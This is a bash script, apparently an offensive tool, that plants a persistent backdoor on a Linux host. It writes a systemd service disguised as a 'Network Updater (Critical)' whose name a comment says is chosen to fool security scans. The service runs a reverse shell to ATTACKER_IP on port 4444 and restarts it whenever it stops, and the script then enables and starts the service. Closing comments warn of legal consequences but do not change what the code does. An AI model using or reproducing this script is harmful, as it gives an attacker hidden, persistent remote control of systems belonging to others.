# Explanation will be provided step-by-step in the following comments (#'s).

#!/bin/bash

# Define the systemd backdoor service name (consider that names like "system-netupd" may trick most unaware security scans by being something required for proper/updated functionalities of system services/operations, such as in this case "system network updates".
SERVICE_NAME="system-netupd"

# Define the target reverse shell command
SHELL_CMD="/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# Write the systemd service
cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=Network Updater (Critical)
After=network.target

[Service]
ExecStart=$SHELL_CMD
Restart=always
Type=simple

[Install]
WantedBy=multi-user.target
EOF

# Reload and activate the malicious service
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

# Again, please do remember the harm/damage it can inflict if used outside of safe/permitted working environments.
# Use of malicious tools is of your own responsibility and will most likely end up in being a criminal act with serious legal repercussions.
# Remember, nothing is ever truly 100% anonymous, there's always a trace, always a leak, always a bread crumb waiting to be followed. If you think something is 100% airgapped, it usually isn't. Zero-days keep being found, vulnerabilities and tools keep rising and popping up unexpectedly. With the rise of the age of AI even more so, there's always a more skilled, better funded threat-actor somewhere on both sides of the table, waiting to catch up and connect the dots. Stay legal, stay ethical, stay safe and stay free :)